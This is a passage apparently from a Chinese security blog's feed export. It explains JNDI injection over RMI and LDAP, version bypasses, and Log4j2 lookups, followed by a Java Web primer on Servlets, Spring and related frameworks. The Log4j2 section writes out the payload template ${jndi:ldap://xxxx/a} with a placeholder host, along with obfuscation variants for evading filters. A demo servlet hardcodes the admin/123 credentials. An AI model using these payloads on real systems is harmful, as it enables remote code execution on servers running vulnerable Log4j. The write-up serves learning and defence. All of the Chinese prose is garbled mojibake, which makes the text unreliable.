Serviceç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†æä¾›åç§°å’Œå¯¹è±¡çš„å…³è”ï¼Œè¿˜å…è®¸å¯¹è±¡å…·æœ‰å±æ€§ã€‚</p></blockquote><p>é€šè¿‡è°ƒç”¨<code>JNDI</code>çš„<code>API</code>å¯ä»¥å®šä½èµ„æºå’Œå…¶ä»–ç¨‹åºå¯¹è±¡ã€‚</p><blockquote><p>é€šè¿‡åç§°æŸ¥æ‰¾(<code>lookup</code>)å¯¹è±¡ </p><p>é€šè¿‡å¯¹è±¡çš„å±æ€§æœç´¢(<code>search</code>)å¯¹è±¡</p></blockquote><p><code>JNDI</code>æ˜¯<code>Java EE</code>çš„é‡è¦éƒ¨åˆ†ï¼Œ<code>JNDI</code>å¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:<code>JDBC</code>ã€<code>LDAP</code>ã€<code>RMI</code>ã€<code>DNS</code>ã€<code>NIS</code>ã€<code>CORBA</code>ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dns:<span class="comment">//domain</span></span><br><span class="line">ldap:<span class="comment">//ip/name</span></span><br><span class="line">rmi:<span class="comment">//ip/name</span></span><br></pre></td></tr></table></figure><h2 id="ä»€ä¹ˆæ˜¯RMI"><a href="#ä»€ä¹ˆæ˜¯RMI" class="headerlink" title="ä»€ä¹ˆæ˜¯RMI"></a>ä»€ä¹ˆæ˜¯RMI</h2><p><code>RMI</code>å…¨ç§°æ˜¯<code>Remote Method Invocation</code>ï¼ˆè¿œç¨‹â½…æ³•è°ƒâ½¤ï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†è®©ä¸¤ä¸ªéš”ç¦»çš„javaè™šæ‹Ÿæœºï¼Œå¦‚è™šæ‹ŸæœºAèƒ½å¤Ÿè°ƒç”¨åˆ°è™šæ‹ŸæœºBä¸­çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™äº›è™šæ‹Ÿæœºå¯ä»¥ä¸å­˜åœ¨äºåŒä¸€å°ä¸»æœºä¸Šã€‚</p><p><strong>RMIå…¶å‘é€ã€æ¥æ”¶çš„æ•°æ®éƒ½æ˜¯ååºåˆ—åŒ–æ•°æ®ã€‚</strong></p><h2 id="ä»€ä¹ˆæ˜¯LDAP"><a href="#ä»€ä¹ˆæ˜¯LDAP" class="headerlink" title="ä»€ä¹ˆæ˜¯LDAP"></a>ä»€ä¹ˆæ˜¯LDAP</h2><p> <code>LDAP</code>ï¼Œå…¨ç§°ä¸º <code>Lightweight Directory Access Protocol</code>ï¼Œå³è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºèµ„æºæŸ¥è¯¢ã€‚</p><h2 id="æ¼æ´å½¢æˆåŸå› "><a href="#æ¼æ´å½¢æˆåŸå› " class="headerlink" title="æ¼æ´å½¢æˆåŸå› "></a>æ¼æ´å½¢æˆåŸå› </h2><blockquote><p>JNDIæ”¯æŒä»æŒ‡å®šçš„è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸‹è½½classæ–‡ä»¶ï¼ŒåŠ è½½åˆ°æœ¬åœ°JVMä¸­ï¼Œå¹¶é€šè¿‡é€‚å½“çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚</p><p>å¦‚æœç›®æ ‡åº”ç”¨è¿›è¡Œäº†JNDIæŸ¥è¯¢ï¼ˆ<code>lookup</code>ï¼‰ï¼Œå¹¶ä¸”å…¶æŸ¥è¯¢çš„åœ°å€æˆ–åç§°å¯æ§çš„è¯ï¼Œå°±ä¼šå½¢æˆJNDIæ³¨å…¥æ¼æ´</p></blockquote><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><img src="/../images/%E6%97%A0%E6%A0%87%E9%A2%98-2023-05-01-1454-1682925503892.png" alt="image-20230502220549589"></p><ol><li><p>æ”»å‡»è€…æ„é€ æ¶æ„åè®®ï¼Œä¼ å…¥æœåŠ¡ç«¯ï¼ˆç›®æ ‡åº”ç”¨ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rmi:<span class="comment">//ip:port/name</span></span><br><span class="line">ldap:<span class="comment">//ip:port/name</span></span><br><span class="line">dns:<span class="comment">//å¤–å¸¦.åŸŸå</span></span><br></pre></td></tr></table></figure></li><li><p>æœåŠ¡ç«¯è¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„æœåŠ¡ï¼ŒæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªæ¶æ„çš„<code>JNDI Reference</code></p></li><li><p>æœåŠ¡ç«¯è§£æè¯¥æ¶æ„<code>JNDI Reference</code></p></li><li><p>æ ¹æ®è§£æç»“æœåˆ°æŒ‡å®šæœåŠ¡å™¨ä¸Šä¸‹è½½<code>Factory</code>çš„å­—èŠ‚ç </p></li><li><p>åŠ è½½å­—èŠ‚ç ï¼Œæ”»å‡»è€…çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ</p></li></ol><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="ä½ç‰ˆæœ¬"><a href="#ä½ç‰ˆæœ¬" class="headerlink" title="ä½ç‰ˆæœ¬"></a>ä½ç‰ˆæœ¬</h4><p>æœåŠ¡ç«¯</p><p><img src="/../images/image-20230501151253546.png" alt="image-20230501151253546"></p><p>RMIæœåŠ¡</p><p><img src="/../images/image-20230501151418991.png" alt="image-20230501151418991"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className,classFactor,classFactoryLocation)</span><br></pre></td></tr></table></figure><blockquote><p><code>className</code>ï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å<br><code>classFactor</code>ï¼šåŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°<br><code>classFactoryLocation</code>ï¼šæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file&#x2F;ftp&#x2F;http ç­‰åè®®</p></blockquote><p>å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„WEBæœåŠ¡å™¨</p><p>æ¶æ„å­—èŠ‚ç å¯¹åº”çš„javaæ–‡ä»¶<img src="/../images/image-20230501151607225.png" alt="image-20230501151607225"></p><p>å…ˆå¯åŠ¨RMIæœåŠ¡å’ŒwebæœåŠ¡å™¨</p><p><img src="/../images/image-20230501152041695.png" alt="image-20230501152041695"></p><p><img src="/../images/image-20230501152052702.png" alt="image-20230501152052702"></p><p>å†å¯åŠ¨Server</p><p><img src="/../images/image-20230501152145871.png" alt="image-20230501152145871"></p><p><img src="/../images/image-20230501152116749.png" alt="image-20230501152116749"></p><h4 id="é«˜ç‰ˆæœ¬"><a href="#é«˜ç‰ˆæœ¬" class="headerlink" title="é«˜ç‰ˆæœ¬"></a>é«˜ç‰ˆæœ¬</h4><p><img src="/../images/image-20230502172305622.png" alt="image-20230502172305622"></p><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> é»˜è®¤ä¸º <code>false</code>ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ <code>if</code> è¯­å¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚</p><h5 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><p>åŸç†</p><p>ç»•è¿‡æŠ›å‡ºå¼‚å¸¸åè¿›å…¥<code>javax.naming.spi.NamingManager</code> </p><p><img src="/../images/image-20230502172806278.png" alt="image-20230502172806278"></p><p><img src="/../images/image-20230502173802695.png" alt="image-20230502173802695"></p><p>å®ç°</p><p><code>Tomcat Server</code>ä¸­çš„<code>BeanFactory</code>ç±»ï¼Œé€šè¿‡è¯¥ç±»çš„<code>getObjectInstance</code>æ–¹æ³•åå°„è°ƒç”¨äº†<code>javax.el.ELProcessor</code>çš„<code>eval</code>æ–¹æ³•ï¼Œæœ€ç»ˆå®ç°äº†ELè¡¨è¾¾å¼æ‰§è¡Œè¾¾åˆ°RCEçš„æ•ˆæœã€‚</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="ä½ç‰ˆæœ¬-1"><a href="#ä½ç‰ˆæœ¬-1" class="headerlink" title="ä½ç‰ˆæœ¬"></a>ä½ç‰ˆæœ¬</h4><p>åŒRMIï¼Œè¿œç¨‹åŠ è½½å³å¯</p><h4 id="é«˜ç‰ˆæœ¬-1"><a href="#é«˜ç‰ˆæœ¬-1" class="headerlink" title="é«˜ç‰ˆæœ¬"></a>é«˜ç‰ˆæœ¬</h4><p>å½“ä»<code>LDAP Server</code>ä¼ æ¥çš„å¯¹è±¡æ˜¯åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨<code>readobject</code>æ–¹æ³•ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="ç‰ˆæœ¬å½±å“"><a href="#ç‰ˆæœ¬å½±å“" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> é»˜è®¤ä¸º <code>false</code></p><p><img src="/../images/1586953-20210613173957090-164407195.png" alt="image-20230502220543519"></p><p>ç»•è¿‡æ–¹æ³•</p><ul><li>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory</li><li>åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget</li></ul><h2 id="Log4J2"><a href="#Log4J2" class="headerlink" title="Log4J2"></a>Log4J2</h2><p>Log4jæ˜¯javaç”¨æ¥å¤„ç†æ—¥å¿—çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œæä¾›äº†<code>Lookups</code>çš„æœºåˆ¶ï¼š</p><blockquote><p>ä¼šå¯¹æ—¥å¿—ä¸­ç”¨ <code>$&#123;prefix:key&#125;</code>åŒ…è£¹èµ·æ¥çš„å˜é‡è¿›è¡Œè§£æ</p></blockquote><p><img src="/../images/image-20230426124656392.png" alt="image-20230426124656392"></p><p>å½“è®°å½•çš„ä¿¡æ¯ä¸º<code>$&#123;jndi:xxx&#125;</code>æ—¶,log4j2å°±ä¼šå‘èµ·<code>JNDI Lookup</code>æŸ¥è¯¢,ä»è€Œè§¦å‘JNDIæ³¨å…¥æ¼æ´ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://xxxx/a&#125;</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡</p><p><code>abc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a<span class="variable">$&#123;:-b&#125;</span>c</span><br><span class="line"><span class="variable">$&#123;lower:b&#125;</span></span><br><span class="line">a<span class="variable">$&#123;::-b&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;E:-a&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;:-<span class="variable">$&#123;:-b&#125;</span>&#125;</span>c</span><br><span class="line">a<span class="variable">$&#123;xxxanycodexxxx:-b&#125;</span>c</span><br><span class="line">    </span><br><span class="line">unicodeç¼–ç ç»•è¿‡</span><br><span class="line">æ’å…¥ç©ºç™½å­—ç¬¦ç»•è¿‡</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Web</title>
      <link href="/2023/05/01/Java%20Web%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/Java%20Web%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet-Tomcat-JSP"><a href="#Servlet-Tomcat-JSP" class="headerlink" title="Servlet Tomcat JSP"></a>Servlet Tomcat JSP</h1><ul><li><p>Tomcat: æ˜¯Servletçš„å®¹å™¨,Servletè¿è¡Œåœ¨Tomcatå®¹å™¨å½“ä¸­,Servletå®¹å™¨æœ‰å¾ˆå¤š(tomcat,Jboss,jetty)ç­‰</p></li><li><p>JSP: å…¨ç§°Java Server Pagesï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç½‘é¡µå¼€å‘æŠ€æœ¯ã€‚å®ƒä½¿ç”¨JSPæ ‡ç­¾åœ¨HTMLç½‘é¡µä¸­æ’å…¥Javaä»£ç ã€‚æ ‡ç­¾é€šå¸¸ä»¥&lt;%å¼€å¤´ä»¥%&gt;ç»“æŸã€‚</p></li><li><p>Serlvet: å…¨ç§°Java Servlet,æ˜¯ç”¨Javaç¼–å†™çš„æœåŠ¡å™¨ç«¯ç¨‹åºã€‚Servletåªæ˜¯ä¸€ä¸ªJavaç±»ï¼Œå°±åƒæ§åˆ¶å™¨ç±»ä¸€æ ·ï¼Œæ¥æ”¶å‰ç«¯ä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œå¤„ç†ã€‚</p><blockquote><p>å®šä¹‰ä¸€ä¸ª Servlet å¾ˆç®€å•ï¼Œåªéœ€è¦ç»§æ‰¿<code>javax.servlet.http.HttpServlet</code>ç±»å¹¶é‡å†™<code>doXXX</code>(å¦‚<code>doGetã€doPost</code>)æ–¹æ³•æˆ–è€…<code>service</code>æ–¹æ³•å°±å¯ä»¥äº†</p><p><img src="/../images/image-20231020191711886.png" alt="image-20231020191711886"></p></blockquote></li></ul><h2 id="åŸºäºWeb-xmlé…ç½®â€“Servlet-lt-3-0"><a href="#åŸºäºWeb-xmlé…ç½®â€“Servlet-lt-3-0" class="headerlink" title="åŸºäºWeb.xmlé…ç½®â€“Servlet&lt;3.0"></a>åŸºäºWeb.xmlé…ç½®â€“Servlet&lt;3.0</h2><p><img src="/../images/201909251250360.png?lastModify=1695796287" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é¡µé¢å’Œç±»æ˜¯æ¯«æ— å…³è”çš„ï¼Œéœ€è¦åœ¨web.xmlé‡Œé¢åˆ›å»ºUrlä¸Servletä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œ<code>/login</code>ç”±<code>FirstServlet</code>æ¥è¿›è¡Œå¤„ç†</p><p><img src="/../images/image-20230925101303360.png" alt="image-20230925101303360"></p><p><strong>ç®€å•å®ç°ç”¨æˆ·ç™»å½•åˆ¤æ–­</strong></p><p>FirstServelt</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equals(password))</span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:green&#x27;&gt;success&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:red&#x27;&gt;fail&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        pw.println(html);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;login&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">  è´¦å·: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">  å¯†ç : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925101208723.png" alt="image-20230925101208723"></p><p><img src="/../images/image-20230925101409954.png" alt="image-20230925101409954"></p><p>è¯·æ±‚çš„å¤„ç†æµç¨‹ï¼šå‰ç«¯è®¿é—®actionï¼Œç„¶ååœ¨web.xmlä¼šæ ¹æ®åŒåçš„url-patternå»è®¿é—®å¯¹åº”çš„servletç±»ï¼Œservletç±»é‡Œé¢åšå®Œç›¸åº”çš„å¤„ç†åï¼Œå†è¿”å›å†…å®¹åˆ°é¡µé¢ä¸Š</p><h2 id="åŸºäºæ³¨è§£â€“Servlet-gt-x3D-3-0"><a href="#åŸºäºæ³¨è§£â€“Servlet-gt-x3D-3-0" class="headerlink" title="åŸºäºæ³¨è§£â€“Servlet&gt;&#x3D;3.0"></a>åŸºäºæ³¨è§£â€“Servlet&gt;&#x3D;3.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;FirstServlet&quot;, urlPatterns = &#123;&quot;/login&quot;&#125;)</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;FirstServlet&quot;, urlPatterns = &#123;&quot;/login&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(name) &amp;&amp; <span class="string">&quot;123&quot;</span>.equals(password))</span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:green&#x27;&gt;success&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            html = <span class="string">&quot;&lt;div style=&#x27;color:red&#x27;&gt;fail&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        pw.println(html);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="MVCè®¾è®¡æ€æƒ³"><a href="#MVCè®¾è®¡æ€æƒ³" class="headerlink" title="MVCè®¾è®¡æ€æƒ³"></a>MVCè®¾è®¡æ€æƒ³</h1><p><img src="/../images/1444254-20201027173804006-1676807374.png" alt="Java SpringMVCä¸‰å±‚æ¶æ„- Tanwheey - åšå®¢å›­"></p><h1 id="ORMâ€“å¯¹è±¡å…³ç³»æ˜ å°„"><a href="#ORMâ€“å¯¹è±¡å…³ç³»æ˜ å°„" class="headerlink" title="ORMâ€“å¯¹è±¡å…³ç³»æ˜ å°„"></a>ORMâ€“å¯¹è±¡å…³ç³»æ˜ å°„</h1><p><img src="/../images/image-20231022144527013.png" alt="image-20231022144527013"></p><h1 id="SSHï¼ˆStruts2-Spring-Hibernateï¼‰"><a href="#SSHï¼ˆStruts2-Spring-Hibernateï¼‰" class="headerlink" title="SSHï¼ˆStruts2 + Spring + Hibernateï¼‰"></a>SSHï¼ˆStruts2 + Spring + Hibernateï¼‰</h1><p><strong>Struts2</strong></p><p><img src="/../images/423c25a95aab63788bf245d9b0716d5b.png" alt="img"></p><p>è§£æï¼šå®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ˆHttpServletRequestï¼‰åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚å°±å…ˆè¿›å…¥web.xmlé…ç½®æ–‡ä»¶çœ‹çœ‹æœ‰æ²¡æœ‰é…ç½®è¿‡æ»¤å™¨ï¼Œå‘ç°æœ‰æœ‰Struts2çš„è¿‡æ»¤å™¨ï¼Œç„¶åæ‰¾åˆ°struts.xmlé…ç½®æ–‡ä»¶ï¼Œstruts.xmlé…ç½®æ–‡ä»¶é‡Œå®šä¹‰ä¸€ä¸ªactionï¼Œç„¶åå°±å»æ‰¾åˆ°actionç±»ï¼Œæ­¤ç±»ç»§æ‰¿ActionSupportæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†execute()æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²â€œsuccessâ€ç»™struts.xmlé…ç½®æ–‡ä»¶ï¼Œstruts.xmlé…ç½®æ–‡ä»¶çš„actionä¼šé»˜è®¤è°ƒç”¨actionç±»çš„execute()æ–¹æ³•ï¼Œresultæ¥æ”¶åˆ°è¿”å›çš„å­—ç¬¦ä¸²ï¼Œresultå°±ä¼šè°ƒç”¨ä½ æŒ‡å®šçš„jspé¡µé¢å°†ç»“æœå‘ˆç°ï¼Œæœ€åå“åº”ç»™å®¢æˆ·ç«¯ã€‚</p><p><strong>Spring</strong> </p><p><img src="/../images/dffcf52ddeb68b17cd944aab3e6d07a4.png" alt="img"></p><p><strong>Hibernate</strong></p><p>Hibernateæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„å¯¹è±¡å…³ç³»æ˜ å°„æ¡†æ¶ï¼Œå®ƒå¯¹JDBCè¿›è¡Œäº†éå¸¸è½»é‡çº§çš„å¯¹è±¡å°è£…ï¼Œå®ƒå°†POJOä¸æ•°æ®åº“è¡¨å»ºç«‹æ˜ å°„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ª<strong>å…¨è‡ªåŠ¨çš„ormæ¡†æ¶</strong>ã€‚</p><h1 id="SSMï¼ˆSpringMVC-Spring-MyBatisï¼‰"><a href="#SSMï¼ˆSpringMVC-Spring-MyBatisï¼‰" class="headerlink" title="SSMï¼ˆSpringMVC + Spring + MyBatisï¼‰"></a>SSMï¼ˆSpringMVC + Spring + MyBatisï¼‰</h1><ul><li><p>SpringMVCä»£æ›¿Struts2</p></li><li><p>MyBatisä»£æ›¿Hibernate</p></li><li><p>Springå¹¶ä¸æ˜¯ä¸€ä¸ªæ–°çš„webæ¡†æ¶ï¼Œè€Œæ˜¯ä½œè€…è®¤ä¸ºjavaçš„æ¡†æ¶å·²ç»è¶³å¤Ÿå¤šä¸”åŠŸèƒ½å®Œå–„ï¼Œåªéœ€è¦ä¸€ä¸ªâ€œå·¥å…·â€å°†ä»–ä»¬æ•´åˆèµ·æ¥å³å¯ï¼Œå› æ­¤springè¯ç”Ÿäº†ã€‚</p><p>Springæœ€é‡è¦çš„ä¸¤ä¸ªæ€æƒ³IOC(DI)å’ŒAOPï¼š</p><ul><li>IOC(DI)å³æ§åˆ¶åè½¬ï¼ˆä¾èµ–æ³¨å…¥ï¼‰ï¼Œè¿™é‡Œçš„æ§åˆ¶æŒ‡çš„æ˜¯å¯¹ç±»å®ä¾‹åŒ–çš„æ§åˆ¶ï¼Œåè½¬æ˜¯æŒ‡é€šå¸¸ç±»çš„å®ä¾‹åŒ–æ˜¯ç”±å¼€å‘äººå‘˜å®Œæˆçš„ï¼Œç°åœ¨å°†è¿™ä¸ªæƒåˆ©ç»™äºˆå®¹å™¨ï¼ˆè¿™é‡Œå°±æ˜¯springï¼‰ï¼Œå‘Šè¯‰å®¹å™¨å®ä¾‹åŒ–ç±»çš„æ–¹æ³•ï¼Œåœ¨ä½¿ç”¨æ—¶å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œé™ä½çš„ä»£ç çš„è€¦åˆåº¦å’Œé‡ï¼ŒåŒæ—¶ä¹Ÿå¢åŠ äº†ç¨‹åºçš„å¯è¯»æ€§ã€‚</li><li>AOPå³é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œç®€å•ç†è§£å°±æ˜¯å°†å„ä¸ªæ¨¡å—å…¬ç”¨çš„æ¨¡å—ï¼ˆå¦‚æ‰“æ—¥å¿—ï¼‰æŠ½å‡ºæ¥ï¼Œä¹Ÿå¯ä»¥é™ä½ä»£ç çš„è€¦åˆåº¦ã€‚</li></ul></li></ul><h1 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h1><p>Spring Boot æ˜¯å¯¹ Spring å·¥ä½œæµå±‚é¢çš„æ¼”è¿›ï¼Œå®ç°åŸºäº Spring çš„æ›´ä¾¿æ·çš„ç”Ÿäº§çº§åˆ«åº”ç”¨ã€‚<br>Spring Boot çš„ä¼˜ç‚¹ï¼š</p><ul><li>å†…åµŒ Servlet å®¹å™¨ï¼Œç‹¬ç«‹è¿è¡Œçš„ Spring é¡¹ç›®ï¼ŒSpring Boot å¯ä»¥å†…åµŒ Tomcatï¼Œä»¥ java -jar xx.jar åŒ…çš„å½¢å¼æ¥è¿è¡Œä¸€ä¸ª Spring Boot åº”ç”¨ï¼Œçœç•¥äº† war åŒ…éƒ¨ç½²çš„ç¹çã€‚</li><li>æä¾› starter æœºåˆ¶ç®€åŒ– Maven ä¾èµ–ç®¡ç†ä¸ Spring é…ç½®ï¼Œå¦‚ä»…éœ€è¦å¼•å…¥â€œspring-boot-starter-webâ€å°±å¯ä»¥åŒ…å« Spring å’Œ SpringMVC ç›¸å…³çš„ä¾èµ–å’Œé…ç½®ã€‚</li></ul><h2 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h2><p><img src="/../images/image-20231026152523289.png" alt="image-20231026152523289"></p><p><a href="https://blog.csdn.net/SThranduil/article/details/86680531">è¿‡æ»¤å™¨ï¼ˆFilterï¼‰å’Œ æ‹¦æˆªå™¨ï¼ˆInterceptor ) çš„åŒºåˆ«_filter_security_interceptor-CSDNåšå®¢</a></p><p>å¦å¤–è¿˜è¦æ³¨æ„<code>POM.xml</code></p><ul><li><p><code>pom.xml</code>ï¼š Maven æ„å»ºè¯´æ˜æ–‡ä»¶ï¼ˆç®¡ç†é¡¹ç›®ä¾èµ–ï¼‰</p><p>spring-booté¡¹ç›®ç‰¹æœ‰çš„æ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository 